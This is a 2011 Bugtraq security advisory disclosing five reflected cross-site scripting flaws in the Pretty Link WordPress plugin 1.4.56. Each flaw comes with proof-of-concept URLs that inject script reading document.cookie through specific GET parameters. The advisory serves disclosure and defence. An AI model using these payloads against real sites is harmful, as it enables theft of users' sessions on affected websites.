
Date: Wed, 12 Oct 2011 16:41:46 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: Multiple vulnerabilities in Pretty Link WordPress Plugin

Vulnerability ID: HTB23049
Reference: https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_pretty_link_wordpress_plugin.html
Product: Pretty Link WordPress Plugin
Vendor: Caseproof  ( http://blairwilliams.com/ ) 
Vulnerable Version: 1.4.56 and probably prior
Tested Version: 1.4.56
Vendor Notification: 21 September 2011 
Vulnerability Type: XSS (Cross Site Scripting)
Risk level: Medium 
Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Pretty Link WordPress Plugin, which can be exploited to perform cross-site scripting attacks.

1) Input passed via the "min_date" GET parameter to /wp-content/plugins/pretty-link/classes/views/prli-clicks/head.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/wp-content/plugins/pretty-link/classes/views/prli-clicks/head.php?min_date=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

2) Input passed via the "message" GET parameter to /wp-content/plugins/pretty-link/classes/views/prli-dashboard-widget/widget.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/wp-content/plugins/pretty-link/classes/views/prli-dashboard-widget/widget.php?message=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

3) Input passed via the "prli_blogurl", "values" GET parameters to /wp-content/plugins/pretty-link/classes/views/prli-links/form.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?prli_blogurl=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?values[slug]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?values[name]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?values[description]=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?values[redirect_type][307]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/prli-links/form.php?values[redirect_type][301]=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

4) Input passed via the "errors" GET parameter to /wp-content/plugins/pretty-link/classes/views/shared/errors.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/wp-content/plugins/pretty-link/classes/views/shared/errors.php?errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

5) Input passed via the "page_first_record", "page_last_record", "record_count", "controller_file", "page_params" GET parameters to /wp-content/plugins/pretty-link/classes/views/shared/table-nav.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&page_first_record=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&page_last_record=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&record_count=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&current_page=2&controller_file=%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/wp-content/plugins/pretty-link/classes/views/shared/table-nav.php?page_count=2&current_page=2&page_params=%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.


Disclaimer: Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on the web page in Reference field.

